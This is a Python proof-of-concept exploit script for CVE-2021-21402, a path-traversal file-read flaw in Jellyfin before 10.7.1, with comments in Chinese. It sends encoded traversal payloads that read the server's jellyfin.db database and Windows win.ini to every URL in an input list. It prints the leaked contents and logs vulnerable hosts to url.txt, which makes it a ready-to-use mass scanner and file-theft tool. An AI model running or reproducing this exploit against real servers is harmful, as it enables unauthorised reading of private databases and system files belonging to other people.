#!/usr/bin/python3
#author:somatra
#Jellyfin任意文件读取漏洞复现CVE-2021-21402
#影响版本：Jellyfin<10.7.1

import requests
import sys

def reader():
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"}
        payload1= '/Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3'
        payload2= '/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/' 
        poc1=urls+payload1
        poc2=urls+payload2
        n=0
        try:
            requests.packages.urllib3.disable_warnings()#解决InsecureRequestWarning警告
            response=requests.get(poc1,headers=headers,timeout=10)
            response2=requests.get(poc2,headers=headers,timeout=10)
            content2=response2.content.decode()
            content=response.content.decode()
            if response2.status_code==200 and "font" in response2.text and "file" in response2.text:
                n=1
            if response.status_code==200 and"font" in response.text and "file" in response.text:
                
                n=1
            if n==1:
                print(u'[+]{} is vulnerability'.format(urls))
                #将漏洞地址输出在url.txt中
                print(poc2)
                print(content2)
                print(poc1)
                print(content)
                f=open('./url.txt','a')
                f.write(urls)
                f.write('\n')
            else:
                print('[-]{} None'.format(urls))
        except:
                print('{} request timeout'.format(urls))
if __name__ == '__main__':
    if len(sys.argv)!=2:
        print('Example:python CVE-2021-21402.py 111.txt')
    else:
        file = open(sys.argv[1])
        for url in file.readlines():
            urls=url.strip()
            if urls[-1]=='/':
                urls=urls[:-1]
            reader()
        print ('Check Over')
